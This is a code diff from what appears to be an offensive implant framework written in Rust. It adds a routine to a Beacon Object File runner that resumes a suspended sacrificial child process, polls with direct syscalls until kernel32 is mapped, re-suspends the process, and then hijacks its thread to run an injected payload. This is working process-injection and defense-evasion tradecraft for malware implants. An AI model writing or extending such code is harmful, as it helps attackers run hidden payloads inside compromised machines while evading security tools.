@@ -155,16 +155,72 @@ pub unsafe fn bof_isolated(blob: &[u8], args: &[String]) -> Result<Response, &'s
     image.extend_from_slice(BOF_HOST_BLOB);
     image.extend_from_slice(&payload);
     let pipe = PipeRead(pipe_read);
-    // No loader-readiness gate: the child's Ldr module list can stay NULL
-    // in non-interactive sessions (observed on windows-latest even for a
-    // normally-running resumed child), so bof-host resolves kernel32 via
-    // the parent-provided image base (payload tail; same-boot ASLR) instead
-    // of the PEB walk — hijack directly.
+    // Loader-readiness gate: a suspended child hijacked BEFORE the loader
+    // runs never maps kernel32 (proven: reading the parent's kernel32 base
+    // in the child returns STATUS_PARTIAL_COPY after a direct hijack), so
+    // bof-host's resolution — PEB walk or fallback — finds nothing. The
+    // loader only initializes on the main thread AFTER resume: resume, poll
+    // until kernel32 is mapped (readable at the parent's base — same-boot
+    // ASLR), re-suspend, then hijack.
+    unsafe {
+        nyx_implant_core::syscalls::init_global();
+        if let Some(rt) = nyx_implant_core::syscalls::global() {
+            let k32 = nyx_implant_core::resolve::module_base_by_name(b"kernel32.dll")
+                .unwrap_or(core::ptr::null_mut()) as usize;
+            if let Err(e) = unsafe { loader_wait_kernel32(rt, &mut proc, k32) } {
+                return Err(e);
+            }
+        } else {
+            return Err("bof isolate: syscall runtime unavailable");
+        }
+    }
     unsafe { run_in_child(&mut proc, &image, pipe.0) }
     // `proc` drops here: handles closed (fire-and-forget once resumed; the
     // never-resumed case — a pre-launch Err above — terminates the suspended
     // child via the SacrificialProcess Drop-guard). `pipe` drops here too:
     // the read handle is closed on every path, success or Err.
+}
+
+/// Resume the suspended child, poll until kernel32 is mapped (loader has
+/// run), then re-suspend for the context hijack. Without this the hijacked
+/// child never maps kernel32 and bof-host can resolve nothing.
+unsafe fn loader_wait_kernel32(
+    rt: &nyx_implant_core::syscalls::Runtime,
+    proc: &mut crate::inject::SacrificialProcess,
+    k32_base: usize,
+) -> Result<(), &'static str> {
+    use nyx_implant_core::syscalls as sc;
+    let mut prev: u32 = 0;
+    let st = unsafe { sc::nt_resume_thread(rt, proc.main_thread as usize, &mut prev) };
+    if st.is_none() || st.unwrap() < 0 {
+        return Err("bof isolate: loader resume failed");
+    }
+    let mut ready = false;
+    for _ in 0..250 {
+        let mut probe: u32 = 0;
+        let st = unsafe {
+            sc::nt_read_virtual_memory(
+                rt,
+                proc.handle as usize,
+                k32_base,
+                (&mut probe as *mut u32) as *mut u8,
+                4,
+            )
+        };
+        if st.is_some() && st.unwrap() >= 0 && probe != 0 {
+            ready = true;
+            break;
+        }
+        unsafe { sc::nt_delay_execution(rt, 0, 20_000) };
+    }
+    if !ready {
+        return Err("bof isolate: kernel32 never mapped in child");
+    }
+    let st = unsafe { sc::nt_suspend_thread(rt, proc.main_thread as usize, &mut prev) };
+    if st.is_none() || st.unwrap() < 0 {
+        return Err("bof isolate: re-suspend failed");
+    }
+    Ok(())
 }
 
 /// Post-spawn half: deliver → hijack → reclaim. Kept separate so every
